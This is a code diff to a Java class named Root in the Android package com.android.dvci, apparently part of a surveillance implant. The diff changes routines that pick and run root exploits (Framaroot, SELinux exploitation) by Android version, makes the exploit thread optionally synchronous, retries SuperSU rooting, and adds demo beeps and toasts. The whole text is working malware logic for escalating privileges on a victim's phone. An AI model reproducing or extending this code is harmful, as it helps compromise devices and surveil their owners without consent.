@@ -2,6 +2,7 @@ package com.android.dvci;
 
 import android.content.Context;
 import android.content.pm.PackageManager;
+import android.widget.Toast;
 
 import com.android.dvci.auto.Cfg;
 import com.android.dvci.capabilities.PackageInfo;
@@ -88,7 +89,7 @@ public class Root {
 		return ret;
 	}
 
-	static public boolean exploitPhone() {
+	static public boolean exploitPhone(boolean synchronous) {
 
 		if (Cfg.DEBUG) {
 			Check.log(TAG + " (exploitPhone) OS: " + android.os.Build.VERSION.SDK_INT);
@@ -117,7 +118,7 @@ public class Root {
 				Check.log(TAG + "(exploitPhone): Android 2.2 to 3.2 detected attempting Framaroot");
 			}
 
-			linuxExploit(true, false);
+			linuxExploit(synchronous, true, false);
 			return true;
 
 		} else if (android.os.Build.VERSION.SDK_INT >= 14 && android.os.Build.VERSION.SDK_INT <= 17) { // ICE_CREAM_SANDWICH
@@ -128,7 +129,7 @@ public class Root {
 						+ "(exploitPhone): Android 4.0 to 4.2 detected attempting Framaroot then SELinux exploitation");
 			}
 
-			linuxExploit(true, true);
+			linuxExploit(synchronous, true, true);
 			return true;
 
 		} else if (android.os.Build.VERSION.SDK_INT == 18) { // JELLY_BEAN_MR2
@@ -136,7 +137,7 @@ public class Root {
 				Check.log(TAG + "(exploitPhone): Android 4.3 detected attempting SELinux exploitation");
 			}
 
-			linuxExploit(false, true);
+			linuxExploit(synchronous, false, true);
 			return true;
 
 		} else if (android.os.Build.VERSION.SDK_INT >= 19) { // KITKAT+
@@ -262,17 +263,23 @@ public class Root {
 				Check.log(TAG + " (supersuRoot) Selinux Shell");
 			}
 
-			Thread thread = new Thread(new Runnable() {
+			selinuxShell();
+
+			/*Thread thread = new Thread(new Runnable() {
 				public void run() {
 					selinuxShell();
 				}
 			});
 			thread.start();
-			Utils.sleep(5000);
 
-			if (PackageInfo.checkRoot()) {
-				Status.self().setReload();
-			}
+			for(int i = 0; i< 10; i++) {
+				Utils.sleep(5000);
+
+				if (PackageInfo.checkRoot()) {
+					Status.self().setReload();
+					break;
+				}
+			}*/
 		}
 	}
 
@@ -598,7 +605,7 @@ public class Root {
 	}
 
 
-	private static void linuxExploit(boolean frama, boolean selinux) {
+	private static void linuxExploit(boolean synchronous, boolean frama, boolean selinux) {
 
 		// Start exploitation thread
 		LinuxExploitThread linuxThread = new LinuxExploitThread(frama, selinux);
@@ -607,6 +614,16 @@ public class Root {
 
 		if (Cfg.DEBUG) {
 			Check.log(TAG + "(linuxExploit): exploitation thread running");
+		}
+
+		if(synchronous){
+			try {
+				exploit.join();
+			} catch (InterruptedException e) {
+				if (Cfg.DEBUG) {
+					Check.log(TAG + " (linuxExploit), exception");
+				}
+			}
 		}
 
 	}
@@ -699,9 +716,13 @@ public class Root {
 
 			// Ask the user...
 			Root.supersuRoot();
+			if (!PackageInfo.checkRoot()) {
+				Root.supersuRoot();
+			}
 
-			// Cyanogen should disable the superuser notification
-			PackageInfo.checkRoot();
+			if(PackageInfo.checkRoot()) {
+				Status.self().setReload();
+			}
 
 			if (Cfg.DEBUG) {
 				Check.log(TAG + " (onStart): isRoot = " + Status.haveRoot()); //$NON-NLS-1$
@@ -981,9 +1002,6 @@ public class Root {
 				}
 
 			} finally {
-				if (getPermissions()) {
-					Status.self().setReload();
-				}
 				semaphore.release();
 			}
 
@@ -1054,7 +1072,10 @@ public class Root {
 								if (Cfg.DEBUG) {
 									Check.log(TAG + "(runSelinuxExploit): exploitation in progress");
 								}
-
+								if (Cfg.DEMO){
+									Beep.bip();
+									Status.self().makeToast("exploitation in progress");
+								}
 								finished = false;
 								break;
 							}
@@ -1079,7 +1100,7 @@ public class Root {
 						}
 
 						finished = true;
-						Utils.sleep(5000);
+						//Utils.sleep(5000);
 					}
 
 					Root.removeScript("fig");
